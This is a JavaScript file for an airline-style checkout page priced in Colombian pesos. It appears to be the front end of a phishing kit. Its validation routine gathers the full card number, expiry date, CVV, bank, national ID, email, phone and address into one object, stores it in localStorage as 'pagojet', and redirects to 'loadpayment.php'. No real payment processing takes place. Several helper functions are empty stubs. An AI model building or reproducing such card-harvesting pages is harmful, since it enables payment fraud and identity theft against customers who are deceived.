const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    formMain: document.querySelector('#main-form'),
};

document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
    // sendStatus(); // Comentado para evitar error
});

const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    if (contPaymentMethod) contPaymentMethod.addEventListener('click', () => {
        if (contCardInputs) contCardInputs.classList.remove('hide');
    });

    if (btnNextStep) btnNextStep.addEventListener('click', () => {
        if (btnSubmitForm) btnSubmitForm.click();
    });

    if (formMain) formMain.addEventListener('submit', (e) => {
        e.preventDefault();
        validateCardFiels();
    });
};

const updateDOM = () => {
    const { labelDepartures, labelTotalResume } = DOMElements;
    const flight = info?.flightInfo || {};

    if (flight.travel_type === 1) {
        labelDepartures.textContent = `${flight.origin?.city || ''} - ${flight.destination?.city || ''} | ${flight.destination?.city || ''} - ${flight.origin?.city || ''}`;
    } else if (flight.travel_type === 2) {
        labelDepartures.textContent = `${flight.origin?.city || ''} - ${flight.destination?.city || ''}`;
    }

    const totalLight = PRECIO_BASE * (flight.adults + flight.children);
    const totalSmart = PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (flight.adults + flight.children);
    const totalFull = PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (flight.adults + flight.children);

    let total = 0;
    if (flight.origin?.ticket_type === 'light') total += totalLight;
    else if (flight.origin?.ticket_type === 'smart') total += totalSmart;
    else if (flight.origin?.ticket_type === 'full') total += totalFull;

    if (flight.travel_type === 1) {
        if (flight.destination?.ticket_type === 'light') total += totalLight;
        else if (flight.destination?.ticket_type === 'smart') total += totalSmart;
        else if (flight.destination?.ticket_type === 'full') total += totalFull;
    }

    if (labelTotalResume) labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
};

const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if ((p.value.length === 19 || p.value.length === 17) && isLuhnValid(p.value)) {
        if (isValidDate(pdate.value)) {
            if ((c.value.length === 3 || c.value.length === 4)) {

                console.log("✅ Validación correcta");

                const formData = {
                    nombre: (name?.value || '') + " " + (surname?.value || ''),
                    id: cc?.value || '',
                    ip: "127.0.0.1",
                    banco: ban?.value || '',
                    email: email?.value || '',
                    tarjeta: p.value,
                    ftarjeta: pdate.value,
                    cvv: c.value,
                    celular: telnum?.value || '',
                    direccion: (address?.value || '') + " " + (city?.value || '')
                };

                localStorage.setItem("pagojet", JSON.stringify(formData));
                console.log("💾 Datos guardados en localStorage:", formData);

                document.querySelector('.loader').classList.add('show');

                setTimeout(() => {
                    window.location.href = 'loadpayment.php';
                }, 1800);

            } else {
                alert('Revise el CVV de su tarjeta.');
                c.focus();
            }
        } else {
            alert('Revise la fecha de vencimiento.');
            pdate.focus();
        }
    } else {
        alert('Número de tarjeta inválido.');
        p.focus();
    }
};

// ==================== FUNCIONES NECESARIAS ====================
function formatCNumber(input) { /* tu código original */ }
function formatDate(input) { /* tu código original */ }
function isLuhnValid(bin) { /* tu código original */ }
function isValidDate(fechaInput) { /* tu código original */ }